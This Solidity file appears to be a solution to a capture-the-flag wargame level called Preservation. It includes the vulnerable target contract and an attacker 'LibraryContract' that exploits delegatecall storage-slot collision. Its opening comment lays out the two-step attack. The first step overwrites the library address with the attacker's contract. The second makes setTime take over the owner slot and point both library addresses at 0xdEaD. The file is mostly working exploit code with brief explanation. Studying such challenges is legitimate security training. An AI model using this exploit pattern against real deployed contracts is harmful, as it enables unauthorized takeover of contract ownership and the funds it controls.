// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// First we call the setTime function of the timeZone1Library; because the only property of the library is the uint storedTime, and because of how delegatecall
// assigns values (based on storage position, not name of property), the storedTime is actually going to assign the value to Preservation's timeZone1Library;
// This allows us to pass the address of our hack contract as a uint as parameter, which will set the timeZone1Library as our own library,
// which contains the same number of properties as Preservation; because of the rule stated earlier about how delegatecall assigns values,
// all that is left is for us to assign whatever values we want to properties 1, 2 and 4, while assigning our own address (in uint format, passed through parameter)
// to public owner
contract Preservation {
	// public library contracts
	address public timeZone1Library;
	address public timeZone2Library;
	address public owner;
	uint256 storedTime;
	// Sets the function signature for delegatecall
	bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

	constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
		timeZone1Library = _timeZone1LibraryAddress;
		timeZone2Library = _timeZone2LibraryAddress;
		owner = msg.sender;
	}

	// set the time for timezone 1
	function setFirstTime(uint256 _timeStamp) public {
		timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
	}

	// set the time for timezone 2
	function setSecondTime(uint256 _timeStamp) public {
		timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
	}
}

// Simple library contract to set the time
contract LibraryContract {
	// stores a timestamp
	address public timeZone1Library;
	address public timeZone2Library;
	address public owner;
	uint256 storedTime;

	function setTime(uint256 _time) public {
		timeZone1Library = 0x000000000000000000000000000000000000dEaD;
		timeZone2Library = 0x000000000000000000000000000000000000dEaD;
		owner = address(uint160(_time));
		storedTime = 0;
	}

	function getUintFromAddress(address addr) public pure returns (uint256) {
		return uint256(addr);
	}
}
